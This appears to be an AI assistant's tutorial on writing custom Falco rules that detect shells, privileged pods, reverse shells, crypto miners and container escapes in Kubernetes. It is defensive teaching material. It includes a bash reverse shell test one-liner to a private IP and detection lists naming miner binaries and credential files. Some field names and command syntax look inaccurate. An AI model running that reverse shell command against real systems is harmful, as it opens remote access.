# ğŸ§  **Writing Custom Falco Rules**

This is the **core skill** that makes you a Falco expert.

---

## â­ Anatomy of a Falco Rule

Every Falco rule has this structure:

```yaml
- rule: <Name of the rule>
  desc: <Human-readable explanation>
  condition: <Logical expression using events, fields, macros, lists>
  output: <What message to print when triggered>
  priority: <INFO | NOTICE | WARNING | ERROR | CRITICAL>
  tags: [tag1, tag2]
```

Example minimal rule:

```yaml
- rule: Detect Exec Into Container
  desc: Detect interactive shell inside a container
  condition: evt.type = execve and container.id != host and proc.name = bash
  output: "Bash executed inside container (user=%user.name container=%container.id process=%proc.cmdline)"
  priority: WARNING
  tags: [container, mitre_execution]
```

---

## â­ The 3 Building Blocks: **Macros**, **Lists**, **Rules**

Falco rules depend on reusable components:

### âœ” **Macros** â†’ Reusable logical expressions

Example:

```yaml
- macro: spawned_process
  condition: evt.type = execve or evt.type = execveat
```

### âœ” **Lists** â†’ Values group

Example:

```yaml
- list: sensitive_binaries
  items: ["sh", "bash", "zsh"]
```

### âœ” **Rules** â†’ Actual detection logic

Rules reference macros/lists for readability.

---

## â­ Event Fields You MUST Know

### **Kubernetes Context Fields**

These come from Falcoâ€™s Kubernetes metadata enrichment (`k8s.`) or audit fields (`k8s.a.`):

| Field                 | Meaning                                   |
| --------------------- | ----------------------------------------- |
| `k8s.ns.name`         | Namespace name                            |
| `k8s.ns.uid`          | Namespace UID                             |
| `k8s.pod.name`        | Pod name                                  |
| `k8s.pod.uid`         | Pod UID                                   |
| `k8s.pod.labels`      | Labels attached to the pod                |
| `k8s.pod.annotations` | Pod annotations                           |
| `k8s.deployment.name` | Deployment name (if pod belongs to one)   |
| `k8s.rc.name`         | ReplicationController name                |
| `k8s.rs.name`         | ReplicaSet name                           |
| `k8s.daemonset.name`  | DaemonSet name                            |
| `k8s.job.name`        | Job name                                  |
| `k8s.cronjob.name`    | CronJob name                              |
| `k8s.a.user.name`     | Kubernetes API request user               |
| `k8s.a.user.groups`   | Groups the user belongs to                |
| `k8s.a.verb`          | API verb (create/update/delete/patch/get) |
| `k8s.a.resource`      | Resource type (pod, secret, role, etc.)   |
| `k8s.a.namespace`     | Namespace targeted by API request         |

---

### **Kubernetes Audit Context Fields**

| Field                                      | Meaning                                             |
| ------------------------------------------ | --------------------------------------------------- |
| `ka.audit.event`                           | Full Kubernetes audit event object                  |
| `ka.audit.verb`                            | API verb (create, update, delete, patch, get)       |
| `ka.audit.object`                          | Resource type (pod, deployment, secret, role, etc.) |
| `ka.audit.user.name`                       | User who performed the API request                  |
| `ka.audit.user.groups`                     | Groups the user belongs to                          |
| `ka.audit.ns.name`                         | Namespace targeted by the request                   |
| `ka.audit.pod.name`                        | Pod name in the request                             |
| `ka.audit.pod.security_context.privileged` | Whether pod spec requested privileged mode          |
| `ka.audit.stage`                           | Audit stage (RequestReceived, ResponseCompleteâ€¦)    |
| `ka.audit.response.status`                 | Status code of the API response                     |
| `ka.audit.sourceIPs`                       | Source IPs of the client making the request         |
| `ka.audit.impersonatedUser`                | User being impersonated (if any)                    |

---

**âœ… Quick Recap:**

- Use **`k8s.`** when you want to detect runtime metadata (e.g., â€œthis pod is privilegedâ€).
- Use **`ka.`** when you want to detect API server actions (e.g., â€œuser X tried to create a privileged podâ€).

Thatâ€™s why your privileged pod rule example used `ka.` â€” itâ€™s watching the **audit log stream**, not the runtime metadata.

### **Process Context**

These fields describe the process inside the container or host:

| Field           | Meaning                             |
| --------------- | ----------------------------------- |
| `proc.name`     | Name of the program executed        |
| `proc.cmdline`  | Full process command line           |
| `proc.exepath`  | Path to the executable              |
| `proc.cwd`      | Current working directory           |
| `proc.suid`     | Saved UID                           |
| `proc.sgid`     | Saved GID                           |
| `user.name`     | User inside container               |
| `user.uid`      | UID                                 |
| `user.loginuid` | Login UID (who started the session) |
| `group.gid`     | Group ID                            |
| `group.name`    | Group name                          |

---

### **Container Context**

These fields describe the container Falco associates with the event:

| Field                        | Meaning                            |
| ---------------------------- | ---------------------------------- |
| `container.id`               | Container ID (runtime-specific)    |
| `container.name`             | Container name                     |
| `container.image.repository` | Image registry/repo                |
| `container.image.tag`        | Image tag                          |
| `container.image.id`         | Image ID (digest)                  |
| `container.mounts`           | Mounted volumes                    |
| `container.type`             | Runtime type (docker, cri-o, etc.) |
| `container.privileged`       | Whether container is privileged    |

---

### **Syscall Context**

These fields describe the syscall Falco intercepted:

| Field          | Meaning                                      |
| -------------- | -------------------------------------------- |
| `evt.type`     | Syscall type (execve, open, chmod, connectâ€¦) |
| `evt.args`     | Raw syscall arguments                        |
| `evt.dir`      | Direction (read/write)                       |
| `evt.res`      | Result (success/failure)                     |
| `evt.time`     | Timestamp of event                           |
| `evt.category` | Category (process, file, net, etc.)          |
| `evt.rawres`   | Raw syscall return code                      |

---

### **File Context**

| Field          | Meaning                         |
| -------------- | ------------------------------- |
| `fd.name`      | File descriptor name (path)     |
| `fd.directory` | Directory portion of path       |
| `fd.filename`  | File name portion               |
| `fd.type`      | Type (file, socket, pipe, etc.) |
| `fd.num`       | File descriptor number          |
| `fd.dev`       | Device info                     |

---

### **Network Context**

| Field      | Meaning                 |
| ---------- | ----------------------- |
| `fd.lip`   | Local IP                |
| `fd.lport` | Local port              |
| `fd.rip`   | Remote IP               |
| `fd.rport` | Remote port             |
| `fd.proto` | Protocol (TCP/UDP)      |
| `fd.sip`   | Source IP (for packets) |
| `fd.dip`   | Destination IP          |
| `fd.sport` | Source port             |
| `fd.dport` | Destination port        |

---

### **Cloud Context (if enabled)**

| Field                     | Meaning                          |
| ------------------------- | -------------------------------- |
| `cloud.provider`          | Cloud provider (AWS, GCP, Azure) |
| `cloud.region`            | Region                           |
| `cloud.availability_zone` | Availability zone                |
| `cloud.instance.id`       | Instance ID                      |
| `cloud.instance.type`     | Instance type                    |

## â­ Your First Custom Rule: Detect Exec Inside Pods

**Goal:** Detect ANY interactive shell opened inside a container.

```yaml
- rule: Detect Interactive Shell in Container
  desc: A shell was spawned inside a Kubernetes container
  condition: >
    evt.type = execve and
    container.id != host and
    proc.name in (bash, sh, zsh, ash)
  output: |
    Interactive shell spawned in container (user=%user.name process=%proc.name container=%container.id pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags: [container, k8s, mitre_execution]
```

Trigger example:

```sh
kubectl exec -it nginx -- /bin/bash
```

Falco output:

```ini
Interactive shell spawned in container (user=root process=bash container=123 pod=nginx-7qd42 ns=default)
```

---

## âœğŸ» Custom Rule: Detect Privileged Pod Creation

**Goal:** Someone creates a privileged pod through Kubernetes API.

```yaml
- rule: Detect Privileged Pod
  desc: Detect creation of a privileged pod
  condition: >
    ka.audit.event and
    ka.audit.verb = create and
    ka.audit.object = pod and
    ka.audit.pod.security_context.privileged = true
  output: >
    Privileged pod created: user=%ka.audit.user.name pod=%ka.audit.pod.name ns=%ka.audit.ns.name
  priority: CRITICAL
  tags: [k8s, security, privilege_escalation]
```

---

## âœğŸ» Custom Rule: Detect Reverse Shell Inside Containers

Detect malicious outbound traffic to unknown IP/port:

```yaml
- rule: Reverse Shell Attempt
  desc: Detect reverse shell inside a container
  condition: >
    evt.type = execve and
    proc.cmdline contains "tcp" and
    proc.cmdline contains "/dev/tcp"
  output: >
    Reverse shell detected (cmdline=%proc.cmdline container=%container.id pod=%k8s.pod.name)
  priority: CRITICAL
  tags: [container, network, mitre_lateral_movement]
```

Test:

```bash
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
```

---

## âœğŸ» Custom Rule: Detect Crypto Miner

```yaml
- list: crypto_miners
  items: ["xmrig", "minerd", "cpuminer", "cryptonight"]

- rule: Detect Crypto Miner Execution
  desc: Detect known crypto mining processes
  condition: evt.type = execve and proc.name in (crypto_miners)
  output: "Crypto miner process detected: %proc.name in container %container.id"
  priority: CRITICAL
  tags: [crypto, container, mitre_impact]
```

---

## âœğŸ» Custom Rule: Detect Container Escape Attempt

Detect `setns()` syscall:

```yaml
- rule: Container Escape Attempt
  desc: Detect attempt to access another namespace via setns syscall
  condition: evt.type = setns and container.id != host
  output: "POSSIBLE CONTAINER ESCAPE (proc=%proc.name container=%container.id syscall=setns)"
  priority: CRITICAL
  tags: [escape, syscall, mitre_privilege_escalation]
```

---

## âœğŸ» Custom Rule: Detect Writing to Sensitive Files (Host Mounts)

```yaml
- list: sensitive_paths
  items: [/etc/passwd, /etc/shadow, /etc/sudoers]

- rule: Container Writing Sensitive File
  desc: Container tried to overwrite sensitive host file
  condition: >
    evt.type = open and
    evt.arg.flags contains O_WRONLY and
    fd.name in (sensitive_paths) and
    container.id != host
  output: "Container attempting to modify sensitive file (%fd.name)"
  priority: CRITICAL
  tags: [filesystem, container, mitre_impact]
```

---

## âœ… Best Practices for Writing Rules

- âœ” Start simple, then tighten conditions
- âœ” Prefer macros and lists for reusability
- âœ” Avoid noisy rules
- âœ” Always include K8s metadata in outputs
- âœ” Use priority wisely
- âœ” Test rules with â€œfalco â€”rules â€¦ â€”dry-runâ€

---

## ğŸ¯ **Now we start hands-on: choose what you want to write next?**

### ğŸ‘‰ Which custom rule do you want to build with me step-by-step?

1. **Detect pod exec attempts (kubectl exec)**
2. **Detect privileged containers**
3. **Detect reverse shell**
4. **Detect crypto miner**
5. **Detect container escape**
6. **Detect writing to sensitive paths**
7. **Detect suspicious network connections**
8. **Detect root user inside containers**
9. **Create a full custom Falco ruleset for your Kubernetes cluster**

Tell me which number you want to build next.
